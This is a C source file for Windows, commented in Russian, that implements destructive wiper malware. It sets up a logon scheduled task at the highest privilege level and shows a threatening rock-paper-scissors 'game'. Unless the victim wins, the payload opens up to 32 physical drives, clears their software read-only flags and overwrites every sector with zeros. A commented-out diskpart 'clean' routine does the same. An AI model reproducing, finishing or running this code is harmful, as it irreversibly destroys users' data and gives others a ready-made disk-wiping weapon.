#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>
#include <winioctl.h>

// заметка*
// это самый разрушительный код, который можно сделать в ring3, но..
// это не повлияет на оффлайн-диски или защищенные аппаратно/ядром диски

// планирует запуск при входе с максимальными правами
void task_sch() {
    char exepath[MAX_PATH]; // поиск текущего исполняемого файла
    char cmd[MAX_PATH + 256]; // буфер для остального кода

    if (!GetModuleFileNameA(NULL, exepath, MAX_PATH)) {
        return;
    }
    sprintf(cmd, 
        "schtasks /create /sc onlogon /tn \"game\" /tr \"%s payload\" /rl highest /f", 
        exepath);
    system(cmd);
    
}

void game() {
    SetConsoleTitleA("Экран");

    printf("=== Let's Play a little Game ===\n");
    printf("If you want your computer back...\n");
    printf("I wouldn't exit this program if I were you");

    srand(time(NULL));
	const char *dict[] = {"", "rock", "paper", "scissors"};
	int robot = rand() % 3 + 1;
	int play;
	printf("rock(1), paper(2), scissors(3) >:");
	scanf("%d", &play);
	int rps = play - robot;
	printf("robot chose %s\n", dict[robot]);
	if (rps > 0 && rps != -2) {
		printf("you won!\n");
        safe();
	} else if (rps == -2) {
        printf("you won!\n");
        safe();
    } else if (rps == -1) {
        printf("you lost :(\n");
	} else if (rps == 0) {
        printf("tie, you lost :(\n"); 
    }
}

// если выиграл, система не будет уничтожена
void safe() {
    system("schtasks /delete /tn \"game\" /f");
}

//1. сканирует >32 дисков
//2. открывает каждый напрямую, неблокирующий i/o
//3. снимает *только программные* атрибуты "только для чтения" -> "IOCTL_DISK_SET_DISK_ATTRIBUTES"
//4. узнает размер диска
//5. обнуляет каждый сектор используя 16 МБ буфер

void payload() {
    /*system(
        "cmd /c echo list disk > ld.txt && diskpart /s ld.txt > lo.txt && "
        "for /f \"tokens=2\" %a in ('findstr /r \"^  *Disk [0-9]\" lo.txt') do ("
        "echo select disk %a >> cl.txt & echo attributes disk clear readonly >> cl.txt & echo clean >> cl.txt) && "
        "diskpart /s cl.txt && del ld.txt && del lo.txt && del cl.txt"
    );*/
    
    // только 32 диска
    for (int disknum = 0; disknum < 32; disknum++) {
        char disk_path[64];
        sprintf(disk_path, "\\\\.\\PhysicalDrive%d", disknum);

        // открываем диск для прямой записи, минуя кэш
        HANDLE hDisk = CreateFileA(
            disk_path,
            GENERIC_READ | GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, 
            OPEN_EXISTING,
            FILE_FLAG_NO_BUFFERING | FILE_FLAG_WRITE_THROUGH,
            0, NULL
        );
        if (hDisk == INVALID_HANDLE_VALUE) continue;

        // снимаем флаг только для чтения
        DISK_ATTRIBUTES attrs = {0};
        DWORD bytesReturned;

        DeviceIoControl(
            hDisk,
            IOCTL_DISK_GET_DISK_ATTRIBUTES,
            NULL, 0,
            &attrs, sizeof(attrs),
            &bytesReturned,
            NULL
        );

        attrs.ReadOnly = 0;

        DeviceIoControl(
            hDisk,
            IOCTL_DISK_SET_DISK_ATTRIBUTES,
            &attrs, sizeof(attrs),
            NULL, 0,
            &bytesReturned,
            NULL
        );

        // узнаем размер диска
        LARGE_INTEGER disk_size;
        DeviceIoControl(
            hDisk,
            IOCTL_DISK_GET_LENGTH_INFO,
            NULL, 0, 
            &disk_size, sizeof(disk_size),
            &bytesReturned,
            NULL
        );

        const size_t bufSize = 16 * 1024 * 1024; // должно быть кратно 512
        char* buffer = (char*)VirtualAlloc(NULL, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (!buffer) { CloseHandle(hDisk); return; }
        ZeroMemory(buffer, bufSize);

        LARGE_INTEGER offset;
        offset.QuadPart = 0;
        DWORD written;

        while (offset.QuadPart < disk_size.QuadPart) {
            SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);
            WriteFile(hDisk, buffer, (DWORD)((disk_size.QuadPart - offset.QuadPart > bufSize) ? bufSize : disk_size.QuadPart - offset.QuadPart), &written, NULL);
            offset.QuadPart += written;
        }

        // освобождаем память
        VirtualFree(buffer, 0, MEM_RELEASE);
        CloseHandle(hDisk);
    }
}

int main(int argc, char *argv[]){
    // чтобы при входе запускался только payload
    // добавлен флаг, чтобы пользователь вводил UAC только один раз в начале
    if (argc > 1 && strcmp(argv[1], "payload") == 0) {
        payload();
        return 0;
    }
    task_sch();
    game();
}
